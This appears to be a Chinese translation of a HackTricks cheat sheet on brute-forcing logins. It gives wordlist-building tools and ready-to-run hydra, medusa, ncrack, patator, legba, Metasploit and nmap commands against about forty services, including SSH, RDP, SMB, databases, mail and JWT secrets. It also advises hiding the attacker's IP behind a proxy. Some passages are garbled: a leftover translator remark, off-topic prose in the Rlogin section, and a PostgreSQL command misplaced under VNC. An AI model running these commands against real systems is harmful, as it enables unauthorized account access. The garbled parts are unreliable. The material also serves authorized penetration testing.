# 暴力破解 - 备忘单

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在**HackTricks 中看到您的公司广告**吗？或者您想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在**推特**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>

## 默认凭证

在谷歌中**搜索**正在使用的技术的默认凭证，或者**尝试以下链接**：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **创建您自己的字典**

收集尽可能多的关于目标的信息，并生成自定义字典。可能有帮助的工具：

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

根据您对受害者的了解（姓名、日期等）生成密码
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

一个词表生成工具，允许您提供一组单词，让您能够从给定的单词中制作出多种变体，创建一个独特且理想的词表，用于针对特定目标。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 字典列表

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 服务

按服务名称字母顺序排列。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM 和 Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker 注册表
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（文件传输协议）是一种用于在网络上交换文件的标准网络协议。黑客可能会尝试使用暴力破解方法来获取FTP服务器的访问权限。这通常涉及尝试大量的用户名和密码组合，直到找到有效的凭证。

#### 工具和资源

- **Hydra**: 这是一个快速的网络登录破解工具，支持多种协议，包括FTP。它可以进行并行字典攻击，使破解过程更加高效。
- **John the Ripper**: 这个工具最初是用来破解Unix密码的，但现在支持多种哈希类型和协议，包括FTP。
- **Patator**: Patator是一个多用途的暴力破解工具，支持多种服务和协议，FTP也在其中。

#### 方法

1. 确定目标FTP服务器的IP地址和端口号。
2. 选择或创建一个用户名和密码的字典文件。
3. 使用上述工具之一，配置好必要的参数，开始暴力破解攻击。
4. 分析结果，如果成功获取凭证，确保合法和负责任地使用它们。

#### 注意事项

- 暴力破解可能会在目标系统上产生大量日志记录，可能会触发安全警报。
- 一些FTP服务器可能有防暴力破解的机制，如账户锁定或延迟响应。
- 使用暴力破解技术可能违反法律，只应在授权的渗透测试或合法的安全评估中使用。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP通用暴力破解

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP基本认证
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post 表单
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
```markdown
对于 http**s**，您需要将 "http-post-form" 更改为 "**https-post-form"**

### **HTTP - CMS --** (W)ordpress、(J)oomla、(D)rupal 或 (M)oodle
```
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP（Internet Message Access Protocol）是一种电子邮件获取协议，它允许客户端从远程邮件服务器读取信息。攻击者可以利用IMAP进行暴力破解攻击，尝试猜测用户的邮箱密码。

#### Brute-force Attack

在暴力破解攻击中，攻击者使用预先准备的密码列表或生成密码的算法，通过不断尝试来猜测正确的密码。这种方法可能会耗费大量时间，并且如果目标系统有尝试次数限制或其他安全措施，攻击可能会失败。

#### Tools

以下是一些可以用于IMAP暴力破解的工具：

- **Hydra**: 这是一个非常流行的网络暴力破解工具，支持多种协议，包括IMAP。
- **CrackMapExec**: 这是一个后渗透工具，也可以用于对IMAP服务进行暴力破解。
- **nmap**: 通过其脚本引擎Nmap Scripting Engine (NSE)，nmap可以执行针对IMAP服务的暴力破解。

#### Mitigation

为了防止IMAP暴力破解攻击，可以采取以下措施：

- 启用账户锁定策略，当检测到多次失败尝试时锁定账户。
- 使用复杂且难以猜测的密码。
- 启用双因素认证（2FA）。
- 监控异常登录尝试。

#### Resources

- [OWASP Testing Guide on Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Weak_Password_Policy)
- [IMAP RFC 3501](https://tools.ietf.org/html/rfc3501)
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC（Internet Relay Chat）是一种在线聊天协议，它允许用户通过不同的频道进行实时通信。黑客和安全研究人员经常使用IRC来交流技术信息、分享工具和协作。尽管它不像以前那么流行，但IRC在某些社区中仍然是一个重要的资源。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT (JSON Web Token)
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL（Microsoft SQL Server）是微软开发的一种关系数据库管理系统。它支持多种数据类型、复杂查询、数据分析和事务处理。MSSQL广泛应用于企业环境中，用于存储和管理大量数据。

在渗透测试中，攻击者可能会尝试使用暴力破解方法来获取对MSSQL数据库的访问权限。这通常涉及尝试大量的用户名和密码组合，直到找到有效的凭据。成功的暴力破解攻击可以让攻击者访问敏感数据，甚至可能获得对整个系统的控制。

为了进行暴力破解攻击，攻击者需要使用专门的工具和技术。这些工具可以自动化登录尝试过程，并能够快速尝试成千上万的不同组合。攻击者还可能利用从其他数据泄露中获得的凭据，因为用户往往会在不同的服务中重复使用相同的密码。

防御暴力破解攻击的方法包括实施账户锁定策略、使用复杂密码、启用多因素认证以及监控异常登录尝试。这些措施可以显著提高系统的安全性，减少被成功攻击的风险。
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
为了使用 **patator** 的 **oracle\_login** 功能，你需要**安装**：
```bash
pip3 install cx_Oracle --upgrade
```
[离线 OracleSQL 哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**版本 11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2** 和 **11.2.0.3**）：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP（邮局协议）是一种用于从邮件服务器接收电子邮件的协议。黑客可以使用暴力破解攻击来尝试获取对电子邮件账户的访问权限。这通常涉及尝试大量的用户名和密码组合，直到找到正确的凭证为止。

#### 工具和资源

- **Hydra**: 这是一个快速的网络登录破解工具，支持多种协议，包括POP3。
- **John the Ripper**: 这个工具通常用于破解密码哈希，但也可以用来对POP3账户进行暴力破解。
- **CrackMapExec**: 一个多功能工具，可以用来对支持POP的邮件服务器进行暴力破解。

#### 方法

1. 确定目标邮件服务器的IP地址和POP3端口（通常是110或995）。
2. 使用上述工具之一，配置攻击参数，包括用户名列表、密码列表和连接设置。
3. 启动攻击并监控进度，直到找到有效的凭证。
4. 一旦获取了访问权限，就可以读取目标的电子邮件。

#### 防御措施

- 启用账户锁定策略，以防止在多次登录失败后继续尝试。
- 使用强密码，并定期更换密码。
- 启用多因素认证，为账户安全增加一层额外保护。
- 监控不寻常的登录尝试，并及时响应可疑活动。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL是一种广泛使用的开源关系数据库管理系统（RDBMS）。在渗透测试中，攻击者可能会尝试使用暴力破解方法来获取对数据库的访问权限。以下是一些用于暴力破解PostgreSQL数据库的工具和资源：

- **Hydra**: 这是一个快速的网络登录破解工具，支持多种协议，包括PostgreSQL。它可以进行并发连接，加快破解速度。
- **Ncrack**: 这个工具由Nmap的开发者创建，旨在帮助公司进行网络安全审计。它支持多种协议，也包括PostgreSQL。
- **Medusa**: 类似于Hydra，Medusa是一个速度极快的并行网络登录破解工具，支持多种服务。

在尝试暴力破解时，应该注意以下几点：

- **账号锁定**: 一些系统在多次登录失败后会锁定账号。这可能会导致服务中断，应谨慎处理。
- **密码策略**: 强密码策略会使暴力破解变得更加困难。了解目标系统的密码策略可以帮助定制破解策略。
- **网络限制**: 目标系统可能有防火墙或其他网络限制措施来阻止暴力破解攻击。了解这些限制并找到方法绕过它们是关键。

使用这些工具时，应始终遵守法律和道德规范。未经授权的访问可能会导致法律后果。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

您可以从 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) 下载 `.deb` 包进行安装。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

Remote Desktop Protocol (RDP) 是一种由 Microsoft 开发的协议，允许用户通过网络连接到另一台计算机。攻击者经常尝试使用暴力破解方法来猜测密码，以便未经授权地访问目标系统。

#### 工具和资源

- **Hydra** - 这是一个快速的网络登录破解工具，支持多种协议，包括 RDP。
- **Ncrack** - 这个工具是专门为网络服务设计的，它可以帮助进行快速的密码破解尝试。
- **Crowbar** - 它是一个针对不同服务的暴力破解工具，也支持 RDP。

#### 方法

1. 确定目标系统的 IP 地址和 RDP 服务端口（默认为 3389）。
2. 选择一个工具并配置必要的参数，如目标 IP、端口和用户名列表。
3. 使用密码字典或生成密码组合来尝试登录。
4. 监控进程并记录成功的登录尝试。

#### 注意事项

- 确保在进行暴力破解时遵守法律和道德规范。
- 暴力破解可能会在目标系统上产生大量日志记录，可能触发安全警报。
- 使用代理或 VPN 来避免直接暴露攻击者的 IP 地址。
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

(此部分保持原样，不需要翻译)
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (remote login) 是一种允许用户在另一台计算机上登录的 UNIX 命令。这个过程通常不使用加密，因此可能会受到中间人攻击。攻击者可以尝试使用暴力破解来获取访问权限。

### Brute Force Attack

暴力破解攻击是一种试图猜测所有可能的密码组合以获得未授权访问的方法。这种方法可能会耗费大量时间，取决于密码的复杂性和攻击者使用的工具。

#### Tools

以下是一些用于暴力破解的工具：

- **Hydra**: 这是一个快速的网络登录破解工具，支持多种协议。
- **John the Ripper**: 这是一个流行的密码破解工具，可以处理多种密码哈希类型。
- **CrackMapExec**: 这是一个后渗透工具，也可以用于暴力破解。

#### Resources

- **SecLists**: 这是一个安全测试者使用的密码列表、用户名列表和其他类型数据的集合。
- **Hashcat**: 这是世界上最快的密码恢复工具之一。

### Password Spraying

密码喷射是一种暴力破解的变体，它使用一个密码尝试访问多个账户，而不是对一个账户尝试多个密码。这种方法可以避免账户因尝试次数过多而被锁定。

### Credential Stuffing

凭证填充是一种自动化攻击，攻击者使用从其他泄露中获取的用户名和密码组合尝试登录到不同的网站。由于许多用户会重复使用密码，这种方法可能会有一定的成功率。
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP (实时流传输协议)
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP（简单网络管理协议）是用于管理网络上设备的一种协议。通过使用不同版本的SNMP，攻击者可以尝试利用默认的或弱的社区字符串来获取敏感信息。

#### 工具

以下是一些用于SNMP爆破的工具：

- **onesixtyone** - 快速扫描大型网络以寻找开放的SNMP服务。
- **snmpcheck** - 无需社区字符串即可提取SNMP信息。
- **snmpwalk** - 用于遍历SNMP节点的工具。
- **snmpbrute** - 用于对SNMP服务进行爆破的工具。

#### 方法

1. **识别目标** - 使用工具如Nmap确定目标网络中的SNMP服务。
2. **枚举** - 使用onesixtyone或snmpwalk等工具枚举信息。
3. **爆破** - 如果需要，使用snmpbrute等工具尝试破解社区字符串。
4. **分析** - 分析获取的信息，寻找敏感数据泄露或配置问题。

#### 资源

- [SNMP Enumeration Guide](https://book.hacktricks.xyz/pentesting/161-pentesting-snmp)
- [snmpwalk Documentation](http://www.net-snmp.org/docs/man/snmpwalk.html)
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) 是一种网络协议，用于加密方式远程登录和操作计算机系统。SSH 提供了一种安全的方法，通过不安全的网络环境中，对服务器进行访问和管理。

#### Brute Force Attack

在 SSH 中，暴力破解攻击是一种常见的攻击手段，攻击者尝试猜测或穷举用户名和密码，以获得对目标系统的访问权限。这种方法通常涉及自动化工具，可以快速尝试成千上万的用户名和密码组合。

#### 防御措施

- **使用强密码**：确保所有用户账户都有强大、复杂的密码。
- **限制尝试次数**：通过配置 SSH 服务来限制登录尝试次数，可以减缓攻击速度。
- **使用密钥认证**：使用基于密钥的认证而不是密码认证，可以大大提高安全性。
- **更改默认端口**：将 SSH 服务从默认的端口 22 更改到其他端口，可以减少自动化攻击。
- **使用防火墙**：配置防火墙规则，只允许可信的 IP 地址进行 SSH 连接。
- **使用双因素认证**：增加一个额外的认证步骤，如使用手机应用生成的一次性密码。

#### 工具

- **Hydra**：一个快速的密码破解工具，支持多种协议，包括 SSH。
- **Ncrack**：一种网络认证破解工具，设计用于高速暴力破解。
- **Medusa**：一种速度极快的并行暴力破解工具，支持多种服务。

通过这些工具和方法，可以有效地测试和加强 SSH 服务的安全性。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### 弱SSH密钥 / Debian可预测的PRNG

某些系统在用于生成加密材料的随机种子中存在已知缺陷。这可能导致密钥空间大幅减少，可以使用如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)等工具进行暴力破解。也有预生成的弱密钥集可用，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。

### STOMP (ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ)

STOMP文本协议允许与消息队列服务进行交互，如ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ。
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。
立即获取访问权限：

